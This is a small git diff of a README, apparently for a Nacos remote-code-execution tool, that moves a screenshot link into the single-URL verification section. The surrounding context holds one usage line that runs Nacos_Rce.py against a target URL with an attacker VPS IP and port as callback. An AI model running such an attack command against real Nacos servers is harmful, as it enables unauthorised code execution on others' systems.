@@ -6,7 +6,6 @@
 ![image](https://github.com/user-attachments/assets/cf7e3ac3-bd47-462c-accc-4fc21b8a731f)
 
 
-![image](https://github.com/user-attachments/assets/66c7cba3-489a-4bf4-876d-f2e375a82b44)
 
 </br>
 
@@ -25,6 +24,7 @@
 ### 2. 单url验证
 ```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -u http://xxx.xxx.xxx```
 ![image](https://github.com/user-attachments/assets/17683bc9-5851-4222-9df7-6b71a8ddd591)
+![image](https://github.com/user-attachments/assets/66c7cba3-489a-4bf4-876d-f2e375a82b44)
 
 
 
